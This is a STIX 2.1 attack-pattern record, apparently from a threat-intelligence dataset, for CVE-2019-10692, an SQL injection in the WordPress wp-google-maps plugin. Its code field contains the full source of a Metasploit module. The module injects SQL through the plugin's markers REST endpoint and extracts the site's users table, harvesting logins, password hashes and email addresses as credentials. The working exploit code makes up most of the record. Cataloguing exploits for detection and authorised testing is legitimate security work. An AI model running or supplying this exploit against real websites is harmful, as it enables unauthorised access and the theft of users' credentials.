{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--c967d846-db78-4ca7-b7db-7c2f803b21de",
    "created": "2024-08-14T16:24:06.110077Z",
    "modified": "2024-08-14T16:24:06.110081Z",
    "name": "WordPress Google Maps Plugin SQL Injection",
    "description": " This module exploits a SQL injection vulnerability in a REST endpoint registered by the WordPress plugin wp-google-maps between 7.11.00 and 7.11.17 (included).  As the table prefix can be changed by administrators, set DB_PREFIX accordingly. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/admin/http/wp_google_maps_sqli.rb",
            "external_id": "wp_google_maps_sqli.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2019-10692"
        },
        {
            "source_name": "WPVDB",
            "external_id": "9249"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HTTP::Wordpress\n\n  def initialize(_info = {})\n    super(\n      'Name' => 'WordPress Google Maps Plugin SQL Injection',\n      'Description' => %q{\n        This module exploits a SQL injection vulnerability in a REST endpoint\n        registered by the WordPress plugin wp-google-maps between 7.11.00 and\n        7.11.17 (included).\n\n        As the table prefix can be changed by administrators, set DB_PREFIX\n        accordingly.\n      },\n      'Author' => [\n        'Thomas Chauchefoin (Synacktiv)', # Vulnerability discovery, Metasploit module\n      ],\n      'License' => MSF_LICENSE,\n      'References' => [\n        ['CVE', '2019-10692'],\n        ['WPVDB', '9249']\n      ],\n      'DisclosureDate' => '2019-04-02'\n    )\n\n    register_options(\n      [\n        OptString.new('DB_PREFIX', [true, 'WordPress table prefix', 'wp_'])\n      ]\n    )\n  end\n\n  def send_sql_request(sql_query)\n    res = send_request_cgi(\n      'method' => 'GET',\n      'uri' => normalize_uri(target_uri.path),\n      'vars_get' => {\n        'rest_route' => '/wpgmza/v1/markers',\n        'filter' => '{}',\n        'fields' => \"#{sql_query}-- -\"\n      }\n    )\n\n    return nil if res.nil? || res.code != 200 || res.body.nil?\n\n    res.body\n  end\n\n  def check\n    mynum = Rex::Text.rand_text_numeric(8..20).to_s\n    body = send_sql_request(mynum)\n    return Exploit::CheckCode::Unknown if body.nil?\n    return Exploit::CheckCode::Vulnerable if body.include?(mynum)\n\n    Exploit::CheckCode::Unknown\n  end\n\n  def run\n    print_status(\"#{peer} - Trying to retrieve the #{datastore['DB_PREFIX']}users table...\")\n\n    body = send_sql_request(\"* from #{datastore['DB_PREFIX']}users\")\n    fail_with(Failure::UnexpectedReply, 'No response or unexpected status code in response') if body.nil?\n\n    begin\n      body = JSON.parse(body)\n    rescue JSON::ParserError\n      fail_with(Failure::NotFound, 'Returned data is not in JSON format')\n    end\n\n    if body.empty?\n      print_error(\"#{peer} - Failed to retrieve the table #{datastore['DB_PREFIX']}users\")\n    else\n      loot = store_loot('wp_google_maps.json', 'application/json', rhost, body.to_s)\n      print_good(\"Credentials saved in: #{loot}\")\n    end\n\n    body.each do |user|\n      print_good(\"#{peer} - Found #{user['user_login']} #{user['user_pass']} #{user['user_email']}\")\n      connection_details = {\n        module_fullname: fullname,\n        username: user['user_login'],\n        private_data: user['user_pass'],\n        private_type: :nonreplayable_hash,\n        workspace_id: myworkspace_id,\n        status: Metasploit::Model::Login::Status::UNTRIED,\n        proof: user['user_email']\n      }.merge(service_details)\n      create_credential(connection_details)\n    end\n  end\nend\n",
    "x_mitre_disclosure_date": "2019-04-02"
}